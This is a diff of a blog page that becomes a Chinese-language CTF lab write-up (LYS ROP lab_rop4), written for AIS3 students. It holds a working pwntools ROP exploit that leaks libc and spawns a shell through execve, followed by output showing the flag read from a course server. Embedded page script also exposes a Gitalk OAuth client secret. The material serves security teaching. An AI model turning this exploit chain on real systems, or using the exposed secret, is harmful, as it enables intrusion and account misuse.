@@ -13,20 +13,26 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://kazma.tw/tags/pwn/page/4/"/>
+    <link rel="canonical" href="https://kazma.tw/2024/08/05/lys-rop-lab-rop4-writeup/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="kazma&#39;s personal space to dive deep into programming, cybersecurity challenges, CTF experiences, and insights from NCKU. Join me on my journey through the digital realm.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="kazma&#39;s blog">
-<meta property="og:url" content="https://kazma.tw/tags/pwn/page/4/index.html">
+        <meta name="description" content="lab_rop4這次藉著到 AIS3 當助教的緣故順便跟 Curious  一起把 LYS ROP 系列課程的 lab 整理到了部落格，也方便給學員參考。那因為是一系列的 lab，所以接下來只會主要講跟上個版本的差異 Diff &amp; Exploitation這次是用更新的 gcc 編譯的，因為沒有 csu_init 所以 binary 沒有 pop_rdi 可以用了，但我們原本其實只是要用他">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LYS Rop lab_rop4 Writeup">
+<meta property="og:url" content="https://kazma.tw/2024/08/05/LYS-Rop-lab-rop4-Writeup/index.html">
 <meta property="og:site_name" content="kazma&#39;s blog">
-<meta property="og:description" content="kazma&#39;s personal space to dive deep into programming, cybersecurity challenges, CTF experiences, and insights from NCKU. Join me on my journey through the digital realm.">
+<meta property="og:description" content="lab_rop4這次藉著到 AIS3 當助教的緣故順便跟 Curious  一起把 LYS ROP 系列課程的 lab 整理到了部落格，也方便給學員參考。那因為是一系列的 lab，所以接下來只會主要講跟上個版本的差異 Diff &amp; Exploitation這次是用更新的 gcc 編譯的，因為沒有 csu_init 所以 binary 沒有 pop_rdi 可以用了，但我們原本其實只是要用他">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-08-05T15:52:01.060Z">
+<meta property="article:modified_time" content="2024-08-05T18:14:31.836Z">
 <meta property="article:author" content="kazma">
-<meta property="article:tag" content="kazma, blog, ctf, reverse, engineering, pwn, binary, ncku, life, programming, coding, cybersecurity">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="lab">
+<meta property="article:tag" content="rop">
+<meta property="article:tag" content="dtmclones">
 <meta name="twitter:card" content="summary">
     
     
@@ -39,7 +45,7 @@
     
     <title>
         
-            Tag: pwn -
+            LYS Rop lab_rop4 Writeup -
         
         kazma&#39;s blog
     </title>
@@ -338,7 +344,7 @@
 
                             <li class="navbar-item">
                                 <!-- Menu -->
-                                <a class="active"
+                                <a class=""
                                    href="/tags"
                                         >
                                     <i class="fa-solid fa-tags fa-fw"></i>
@@ -470,7 +476,7 @@
 
                     <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                         
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                            href="/tags"
                         >
                             <span>
@@ -602,97 +608,262 @@
             <div class="main-content">
 
                 
-                    <div class="tag-container">
-	<div class="tag-name">
-		<i class="fa-solid fa-tag"></i>&nbsp;pwn
-	</div>
-	<div class="tag-post-list">
-		
-<div class="archive-list-container">
-    
-        <section class="archive-item mb-spacing-unit last:mb-0">
-            <div class="archive-item-header flex flex-row items-center mb-2">
-                <span class="archive-year font-semibold text-3xl mr-2">2023</span>
-                <span class="archive-year-post-count text-xs md:text-sm font-bold rounded-small bg-third-background-color py-[2px] px-[10px] border border-border-color">6</span>
-            </div>
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
             
-            <ul class="article-list pl-0 md:pl-8 text-lg leading-[1.5]">
-                
-                    
-                    
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='12-17'>
-                    
-                    <a href="/2023/12/17/Yuawn-Pwn2-ret2plt-Writeup/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Yuawn Pwn2 ret2plt Writeup</span>
-                    </a>
-                    
-                
-                    
-                    
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">LYS Rop lab_rop4 Writeup</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/kazma.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">kazma</span>
                         
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='12-13'>
-                    
-                    <a href="/2023/12/13/Yuawn-Pwn1-casino-Writeup/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Yuawn Pwn1 casino Writeup</span>
-                    </a>
-                    
-                
-                    
-                    
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">成大資安社 創辦人/社長</span>
                         
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='12-12'>
-                    
-                    <a href="/2023/12/12/LYS-Rop-lab-rop1-Writeup/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">LYS Rop lab_rop1 Writeup</span>
-                    </a>
-                    
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-08-05 23:52:01</span>
+        <span class="mobile">2024-08-05 23:52:01</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-08-06 02:14:31</span>
+            <span class="mobile">2024-08-06 02:14:31</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
                 
-                    
-                    
-                    <a href="/2023/12/12/Yuawn-Pwn2-rop-Writeup/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Yuawn Pwn2 rop Writeup</span>
-                    </a>
-                    
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
                 
-                    
-                    
-                        
-                            </li>
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='12-10'>
-                    
-                    <a href="/2023/12/10/Yuawn-Pwn1-orw-Writeup/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Yuawn Pwn1 orw Writeup</span>
-                    </a>
-                    
+                    <li>
+                        | <a href="/tags/writeup/">writeup</a>&nbsp;
+                    </li>
                 
-                    
-                    
-                    <a href="/2023/12/10/Yuawn-Pwn1-bof-Writeup/" class="block overflow-hidden w-fit">
-                        <span class="article-title my-0.5 text-2xl">Yuawn Pwn1 bof Writeup</span>
-                    </a>
-                    
+                    <li>
+                        | <a href="/tags/lab/">lab</a>&nbsp;
+                    </li>
                 
-                </li> <!-- Ensure the last item is properly closed -->
+                    <li>
+                        | <a href="/tags/rop/">rop</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/dtmclones/">dtmclones</a>&nbsp;
+                    </li>
+                
             </ul>
-        </section>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
     
 </div>
 
-	</div>
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="lab-rop4"><a href="#lab-rop4" class="headerlink" title="lab_rop4"></a>lab_rop4</h1><p>這次藉著到 AIS3 當助教的緣故順便跟 <a class="link"   target="_blank" rel="noopener" href="https://curious-lucifer.netlify.app/" >Curious <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 一起把 LYS ROP 系列課程的 lab 整理到了部落格，也方便給學員參考。<br>那因為是一系列的 lab，所以接下來只會主要講跟上個版本的差異</p>
+<h2 id="Diff-Exploitation"><a href="#Diff-Exploitation" class="headerlink" title="Diff &amp; Exploitation"></a>Diff &amp; Exploitation</h2><p>這次是用更新的 gcc 編譯的，因為沒有 csu_init 所以 binary 沒有 pop_rdi 可以用了，但我們原本其實只是要用他來指定 printf 要 leak 某個 libc_adress，那 printf 在設定 rdi 時其實是用 <code>mov rdi, rax</code>，所以換句話說，我們只要控好 rax 就可以成功 leak，那這可以透過 <code>deregister_tm_clones</code> 來讓 rax 設定成一個特定的值，剛好因為 <code>setvbuf</code> 的關係所以 <code>deregister_tm_clones</code> 這邊會執行 <code>mov eax, stdout@GLIBC_2.2.5</code>，就可以 leak 出 stdout_got 算出 libc_base，那最後會用 <code>execve(&#39;/bin/sh&#39;, 0, 0)</code> 而不是像之前一樣 <code>system(&#39;/bin/sh&#39;)</code> 是因為 system 的毛比較多，exploit 跑到 system 裡會爛掉，改成 <code>execve</code> 就可以順利 RCE 了。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">l = ELF(<span class="string">&quot;../libc.so.6&quot;</span>)</span><br><span class="line">r = process(<span class="string">&quot;./rop4&quot;</span>)</span><br><span class="line"></span><br><span class="line">dtmclones = <span class="number">0x4010D0</span></span><br><span class="line">ret = <span class="number">0x40101A</span></span><br><span class="line">name = <span class="number">0x404060</span></span><br><span class="line">mov_rdi_rax = <span class="number">0x401240</span></span><br><span class="line"></span><br><span class="line">p = flat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span>, name + <span class="number">0x10</span>, ret, dtmclones, mov_rdi_rax)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;? &quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;: &quot;</span>, p)</span><br><span class="line">r.sendline(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x21A780</span></span><br><span class="line">success(<span class="string">&quot;libc_base -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address))</span><br><span class="line"></span><br><span class="line">pop_rdi = l.address + <span class="number">0x2A3E5</span></span><br><span class="line">pop_rsi = l.address + <span class="number">0x2BE51</span></span><br><span class="line">pop_rax = l.address + <span class="number">0x45EB0</span></span><br><span class="line">pop_rdx = l.address + <span class="number">0x796A2</span></span><br><span class="line">syscall = l.address + <span class="number">0x29DB4</span></span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="string">b&quot;a&quot;</span> * <span class="number">0x18</span>,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3B</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>)),</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rdx,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    syscall,</span><br><span class="line">)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;: &quot;</span>, p2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/lys_rop/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 35.229.243.81 on port 10104: Done</span><br><span class="line">[+] libc_base -&gt; 0x7f9d93996000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">cat</span> /home/chal/flag.txt</span><br><span class="line">FLAG&#123;323c28b8ccb8caf18383bc9529212924&#125;$</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> LYS Rop lab_rop4 Writeup</li>
+        <li><strong>Author:</strong> kazma</li>
+        <li><strong>Created at
+                :</strong> 2024-08-05 23:52:01</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-08-06 02:14:31
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kazma.tw/2024/08/05/LYS-Rop-lab-rop4-Writeup/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
 </div>
 
-<div class="tag-paginator">
-	<div class="paginator">
-    <a class="extend prev" rel="prev" href="/tags/pwn/page/3/"><i class="fa-regular fa-angle-left"></i></a><a class="page-number" href="/tags/pwn/">1</a><a class="page-number" href="/tags/pwn/page/2/">2</a><a class="page-number" href="/tags/pwn/page/3/">3</a><span class="page-number current">4</span>
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/writeup/">#writeup</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/lab/">#lab</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/rop/">#rop</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/dtmclones/">#dtmclones</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/08/03/LYS-Rop-lab-rop3-Writeup/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">LYS Rop lab_rop3 Writeup</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="//cdn.staticfile.org/gitalk/1.8.0/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: '68fd7e0e6c37358fbb4f',
+                    clientSecret: 'dc6a9d6490a92521e96b38717770845226846c62',
+                    repo: 'kazmatw.github.io',
+                    owner: 'kazmatw',
+                    admin: ['kazmatw'],
+                    id: __gitalk__pathname,
+                    language: 'en',
+                    proxy: 'https://github.com/login/oauth/access_token'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
 </div>
 
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">LYS Rop lab_rop4 Writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#lab-rop4"><span class="nav-text">lab_rop4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Diff-Exploitation"><span class="nav-text">Diff &amp; Exploitation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Result"><span class="nav-text">Result</span></a></li></ol></li></ol>
+
+    </div>
 </div>
+        </div>
+    
+</div>
+
 
 
                 
@@ -775,6 +946,27 @@
         </div>
     </div>
 
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
     
 
     <div class="right-side-tools-container">
